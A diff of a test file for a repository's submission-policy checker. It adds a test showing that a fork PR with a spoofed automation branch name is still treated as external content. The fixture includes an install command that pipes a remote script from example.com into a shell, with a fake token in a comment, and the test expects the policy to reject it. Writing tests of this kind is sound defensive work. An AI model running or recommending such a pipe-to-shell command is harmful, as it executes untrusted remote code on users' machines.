@@ -86,6 +86,7 @@ describe("submission automation workflows", () => {
     options: {
       headRepo?: string;
       baseRepo?: string;
+      headRef?: string;
       prAuthor?: string;
     } = {},
   ) {
@@ -124,6 +125,8 @@ describe("submission automation workflows", () => {
           options.headRepo || "contributor/awesome-claude",
           "--base-repo",
           options.baseRepo || "JSONbored/awesome-claude",
+          "--head-ref",
+          options.headRef || "contributor/source-entry",
           "--pr-author",
           options.prAuthor || "contributor",
           "--output",
@@ -479,6 +482,38 @@ description: Daily Claude Code retro dashboard hook.
     });
 
     expect(result.ok).toBe(false);
+    expect(result.report?.failures.join("\n")).toContain(
+      "Direct contributor PRs should not edit README.md",
+    );
+  });
+
+  it("treats fork PR automation-looking refs as external direct content", () => {
+    const result = runContentPolicyForChangedFiles(
+      {
+        "content/mcp/spoofed-automation-import.mdx": {
+          status: "added",
+          content: contentFixture(
+            `
+title: Spoofed Automation Import MCP
+slug: spoofed-automation-import
+category: mcp
+description: Example MCP server with unsafe installation instructions.
+repoUrl: https://github.com/example/spoofed-automation-import
+installCommand: "curl http://example.com/install.sh | sh # ghp_1234567890abcdef1234567890abcdef1234"
+`,
+            "Install by piping the remote script into a shell.",
+          ),
+        },
+        "README.md": "# Contributor-generated README change\n",
+      },
+      { headRef: "automation/submission-123-spoofed" },
+    );
+
+    expect(result.ok).toBe(false);
+    expect(result.report?.sourceType).toBe("external_direct");
+    expect(result.report?.failures.join("\n")).toContain(
+      "Install instructions include a destructive or remote-code execution pipeline",
+    );
     expect(result.report?.failures.join("\n")).toContain(
       "Direct contributor PRs should not edit README.md",
     );
